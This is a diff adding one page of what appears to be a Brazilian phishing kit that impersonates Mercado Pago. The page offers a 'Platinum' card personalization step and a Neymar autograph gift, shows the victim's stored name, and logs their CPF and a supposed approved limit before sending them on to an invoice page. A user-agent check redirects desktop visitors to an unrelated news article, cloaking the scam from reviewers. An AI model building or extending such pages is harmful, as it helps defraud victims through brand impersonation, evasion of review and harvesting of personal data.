@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <title>Personalize seu Cartão - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #FFE600;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #3483FA;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #3483FA;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 40px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .card {
+            background: linear-gradient(135deg, #3483FA, #2968C8);
+            border-radius: 12px;
+            padding: 20px;
+            height: 200px;
+            width: 340px;
+            margin: 0 auto 30px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(52, 131, 250, 0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+        }
+
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 60px;
+        }
+
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: absolute;
+            bottom: 15px;
+            left: 20px;
+            right: 20px;
+        }
+
+        .card-name {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            color: rgb(255, 255, 255);
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        /* Logo pequeno para o cartão */
+        .card-logo {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card-logo img {
+            width: 100%;
+            height: auto;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
+        .colors-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 18px;
+            margin: 50px 0;
+            animation: fadeIn 0.6s ease-out 0.3s both;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .color-circle {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+            border: 2px solid rgba(255,255,255,0.9);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+        }
+        .color-circle:hover {
+            transform: translateY(-3px) scale(1.08);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+        }
+        .color-circle.active {
+            transform: translateY(-5px) scale(1.12);
+            border: 3px solid #3483FA;
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+        }
+        .color-circle.active::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 12px;
+            font-weight: 900;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+        .blue-color {
+            background: linear-gradient(135deg, #3483FA, #2968C8);
+        }
+        .yellow-color {
+            background: linear-gradient(135deg, #FFE600, #E6CF00);
+        }
+        .red-color {
+            background: linear-gradient(135deg, #E53935, #C62828);
+        }
+        .gray-color {
+            background: linear-gradient(135deg, #999999, #757575);
+        }
+        .black-color {
+            background: linear-gradient(135deg, #1A1A1A, #000000);
+        }
+        .button {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 18px 45px;
+            border-radius: 6px;
+            text-decoration: none;
+            display: block;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 0.8s ease-out 0.5s both;
+        }
+        .button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+            background: #2968C8;
+        }
+        .button:hover::before {
+            left: 100%;
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        /* Brinde */
+        .brinde-container {
+            margin-bottom: 30px;
+            animation: fadeIn 0.6s ease-out 0.4s both;
+            text-align: center;
+        }
+        .brinde-titulo {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 6px;
+        }
+        .brinde-subtitulo {
+            font-size: 13px;
+            color: #999999;
+            margin-bottom: 16px;
+        }
+        .brinde-imagem {
+            background: #F8F8F8;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            padding: 16px;
+            margin: 0 auto 16px;
+            max-width: 260px;
+        }
+        .brinde-imagem img {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            display: block;
+            border-radius: 4px;
+        }
+        .brinde-opcoes {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        .brinde-opcao {
+            flex: 1;
+            max-width: 180px;
+            border: 2px solid #EEEEEE;
+            border-radius: 8px;
+            padding: 14px 12px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333333;
+            position: relative;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            min-height: 52px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.08);
+        }
+        .brinde-opcao:hover {
+            border-color: #3483FA;
+            box-shadow: 0 3px 10px rgba(52, 131, 250, 0.2);
+        }
+        .brinde-opcao:focus {
+            outline: 2px solid #3483FA;
+            outline-offset: 2px;
+        }
+        .brinde-opcao.active {
+            border: 3px solid #3483FA;
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+            color: #3483FA;
+            font-weight: 600;
+        }
+        .brinde-opcao-check {
+            display: none;
+            font-weight: 900;
+            font-size: 12px;
+        }
+        .brinde-opcao.active .brinde-opcao-check {
+            display: inline;
+        }
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 20px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .logo-container img {
+                height: 40px;
+            }
+            .button {
+                padding: 16px 35px;
+                font-size: 15px;
+            }
+            .colors-container {
+                gap: 15px;
+            }
+            .color-circle {
+                width: 35px;
+                height: 35px;
+            }
+            .card {
+                width: 100%;
+                max-width: 320px;
+            }
+            .brinde-imagem {
+                max-width: 200px;
+            }
+            .brinde-opcao {
+                font-size: 13px;
+                padding: 12px 8px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <h1 class="main-title">Personalize o seu cartão</h1>
+
+        <div class="card" id="creditCard">
+            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+
+            <div class="card-top">
+                <!-- Logo pequeno no cartão -->
+                <div class="card-logo" id="cardLogo">
+                    <img src="https://i.postimg.cc/0Qz4HdcQ/icone.png" alt="Mercado Pago" style="width: 50px; height: auto;">
+                </div>
+                <div style="font-size: 12px; color: rgba(255, 255, 255, 0.8); font-family: 'Inter', sans-serif; text-transform: uppercase; letter-spacing: 1px;">Platinum</div>
+            </div>
+
+            <div style="position: absolute; top: 60%; left: 0; transform: translateY(-50%); width: 100%;">
+                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                    <div style="display: flex; align-items: center; margin-left: 20px;">
+                        <img src="https://i.postimg.cc/VNBsLddY/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(255, 255, 255, 0.3));">
+                    </div>
+                    <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
+                </div>
+            </div>
+
+            <div class="card-bottom">
+                <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                    <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">NOME DO TITULAR</span>
+                    <span style="font-size: 8px; color: rgba(255, 255, 255, 0.7); font-family: 'Inter', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: flex-end; justify-content: flex-end;">
+                    <img src="https://logos-world.net/wp-content/uploads/2020/09/Mastercard-Logo.png" alt="mastercard" style="width: 50px;">
+                </div>
+            </div>
+
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+        </div>
+
+        <div class="colors-container">
+            <div class="color-circle blue-color active" onclick="selectNewColor('blue', '#3483FA', '#3483FA', '#2968C8', this)"></div>
+            <div class="color-circle yellow-color" onclick="selectNewColor('yellow', '#FFE600', '#FFE600', '#E6CF00', this)"></div>
+            <div class="color-circle red-color" onclick="selectNewColor('red', '#E53935', '#E53935', '#C62828', this)"></div>
+            <div class="color-circle gray-color" onclick="selectNewColor('gray', '#999999', '#9E9E9E', '#757575', this)"></div>
+            <div class="color-circle black-color" onclick="selectNewColor('black', '#1A1A1A', '#1A1A1A', '#000000', this)"></div>
+        </div>
+
+        <div class="brinde-container">
+            <h2 class="brinde-titulo">Deseja receber o brinde exclusivo?</h2>
+            <p class="brinde-subtitulo">Pack de figurinhas autografadas pelo Neymar Jr.</p>
+            <div class="brinde-imagem">
+                <img src="https://i.postimg.cc/3w2zGdks/Design-sem-nome-(38).png"
+                     alt="Pack de figurinhas autografadas pelo Neymar Jr."
+                     loading="lazy">
+            </div>
+            <div class="brinde-opcoes" role="radiogroup" aria-label="Deseja receber o brinde exclusivo?">
+                <div class="brinde-opcao active" role="radio" aria-checked="true" tabindex="0"
+                     onclick="selectBrinde('sim', this)">
+                    <span class="brinde-opcao-check">✓</span>
+                    Sim, quero receber
+                </div>
+                <div class="brinde-opcao" role="radio" aria-checked="false" tabindex="0"
+                     onclick="selectBrinde('nao', this)">
+                    <span class="brinde-opcao-check">✓</span>
+                    Não, obrigado
+                </div>
+            </div>
+        </div>
+
+        <button class="button" onclick="continuarPersonalizacao()">Continuar</button>
+    </div>
+
+    <footer>
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página 10:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO
+        // =======================================================
+
+        const UserData = {
+            save: function(dados) {
+                sessionStorage.setItem('user_data', JSON.stringify(dados));
+            },
+            load: function() {
+                const dados = sessionStorage.getItem('user_data');
+                return dados ? JSON.parse(dados) : null;
+            },
+            update: function(novosDados) {
+                const dadosExistentes = this.load() || {};
+                const dadosAtualizados = { ...dadosExistentes, ...novosDados };
+                this.save(dadosAtualizados);
+                return dadosAtualizados;
+            },
+            clear: function() {
+                sessionStorage.removeItem('user_data');
+            }
+        };
+
+        const dadosUsuario = UserData.load();
+        console.log('Dados do usuário carregados:', dadosUsuario);
+
+        if (dadosUsuario && dadosUsuario.nome) {
+            document.getElementById('cardName').textContent = dadosUsuario.nome.toUpperCase();
+        }
+
+        let corSelecionada = 'blue';
+        let corHex = '#3483FA';
+        let brindeEscolha = 'sim';
+
+        function selectBrinde(opcao, element) {
+            document.querySelectorAll('.brinde-opcao').forEach(btn => {
+                btn.classList.remove('active');
+                btn.setAttribute('aria-checked', 'false');
+            });
+            element.classList.add('active');
+            element.setAttribute('aria-checked', 'true');
+            brindeEscolha = opcao;
+        }
+
+        document.querySelectorAll('.brinde-opcao').forEach(btn => {
+            btn.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    btn.click();
+                }
+            });
+        });
+
+        function selectNewColor(color, hex, color1, color2, element) {
+            document.querySelectorAll('.color-circle').forEach(circle => {
+                circle.classList.remove('active');
+            });
+
+            element.classList.add('active');
+
+            document.getElementById('creditCard').style.background = `linear-gradient(135deg, ${color1}, ${color2})`;
+
+            corSelecionada = color;
+            corHex = hex;
+        }
+
+        // =======================================================
+        // FUNÇÃO ATUALIZADA PARA PRESERVAR PARÂMETROS
+        // =======================================================
+
+        function continuarPersonalizacao() {
+            // Desabilita o botão para evitar cliques duplos
+            const btn = document.querySelector('.button');
+            btn.disabled = true;
+            btn.textContent = 'Carregando...';
+            
+            UserData.update({
+                etapa_atual: 'personalizacao',
+                cartao_cor: corSelecionada,
+                cartao_cor_hex: corHex,
+                brinde_escolha: brindeEscolha,
+                personalizacao_data: new Date().toISOString()
+            });
+
+            console.log('Personalização salva:', corSelecionada, corHex);
+            
+            // Redireciona preservando parâmetros
+            window.location.href = buildUrlWithParams('fatura.html');
+        }
+
+        if (dadosUsuario) {
+            console.log('CPF:', dadosUsuario.cpf);
+            console.log('Nome:', dadosUsuario.nome);
+            console.log('Cartão aprovado:', dadosUsuario.cartao_aprovado);
+            console.log('Limite:', dadosUsuario.cartao_limite);
+        }
+    </script>
+</body>
+</html>
